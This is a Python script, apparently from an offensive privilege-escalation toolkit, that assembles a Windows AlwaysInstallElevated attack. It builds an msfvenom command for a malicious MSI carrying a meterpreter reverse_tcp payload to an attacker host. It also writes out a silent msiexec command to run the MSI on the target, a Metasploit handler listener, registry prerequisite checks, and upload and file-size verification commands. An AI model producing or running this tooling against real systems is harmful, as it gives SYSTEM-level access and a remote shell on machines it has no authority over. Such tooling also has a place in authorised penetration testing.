#!/usr/bin/env python3
"""Build AlwaysInstallElevated MSI payload and deployment commands.

Generates:
  1. msfvenom command to create a malicious MSI
  2. msiexec command to install (execute) the MSI on target

Does NOT execute by default. Print the commands and emit JSON.

Usage:
  python skills/privesc/scripts/always_install.py --lhost 10.0.0.1 --lport 4444 -o payload.msi
"""

from __future__ import annotations

import argparse
import json
import shutil


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="AlwaysInstallElevated MSI command builder."
    )
    parser.add_argument("--lhost", required=True, help="Listener host (attacker IP)")
    parser.add_argument(
        "--lport", required=True, type=int, help="Listener port (attacker)"
    )
    parser.add_argument(
        "-o", "--output", required=True, help="Output MSI filename / path"
    )
    parser.add_argument(
        "--payload",
        default="windows/x64/meterpreter/reverse_tcp",
        help="msfvenom payload (default: windows/x64/meterpreter/reverse_tcp)",
    )
    return parser.parse_args()


def build_msfvenom_cmd(args: argparse.Namespace) -> list[str]:
    binary = shutil.which("msfvenom") or "msfvenom"
    return [
        binary,
        "-p",
        args.payload,
        "LHOST=" + args.lhost,
        "LPORT=" + str(args.lport),
        "-f",
        "msi",
        "-o",
        args.output,
    ]


def build_msiexec_cmd(output: str) -> list[str]:
    return ["msiexec", "/quiet", "/qn", "/i", output]


def build_handler_snippet(args: argparse.Namespace) -> list[str]:
    return [
        'msfconsole -q -x "use exploit/multi/handler; '
        + "set PAYLOAD "
        + args.payload
        + "; "
        + "set LHOST "
        + args.lhost
        + "; "
        + "set LPORT "
        + str(args.lport)
        + "; "
        + 'run"'
    ]


def main() -> int:
    args = parse_args()
    msfvenom_cmd = build_msfvenom_cmd(args)
    msiexec_cmd = build_msiexec_cmd(args.output)
    handler_snippet = build_handler_snippet(args)

    payload = {
        "method": "AlwaysInstallElevated",
        "tool": "msfvenom",
        "binary_found": bool(shutil.which("msfvenom")),
        "lhost": args.lhost,
        "lport": args.lport,
        "output": args.output,
        "msfvenom_command": msfvenom_cmd,
        "msfvenom_command_str": " ".join(msfvenom_cmd),
        "msiexec_command": msiexec_cmd,
        "msiexec_command_str": " ".join(msiexec_cmd),
        "handler_snippet": handler_snippet[0],
        "prerequisites": [
            "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated = 1",
            "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated = 1",
        ],
        "verify_cmd": (
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && "
            "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
        ),
        "upload_workflow": {
            "terminal_focus_required": True,
            "progress_visibility": "Keep the terminal focused while the MSI is being uploaded to the target. Do not interrupt a large transfer.",
            "suggested_upload_command": f"upload {args.output} C:\\Windows\\Temp\\{args.output}",
            "size_verification": {
                "required": True,
                "method": "size",
                "remote_commands": [
                    f"Get-Item 'C:\\Windows\\Temp\\{args.output}' | Select-Object FullName,Length",
                    f"dir 'C:\\Windows\\Temp\\{args.output}'",
                    f"powershell -c \"(Get-Item 'C:\\Windows\\Temp\\{args.output}').Length\"",
                ],
                "compare_rule": "Treat the MSI upload as successful only when the remote file size matches the local MSI size.",
            },
        },
        "notes": (
            "Both registry keys must be set to 1. "
            "Run msfvenom_command to create the MSI, start handler, then run msiexec_command on target."
        ),
    }

    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
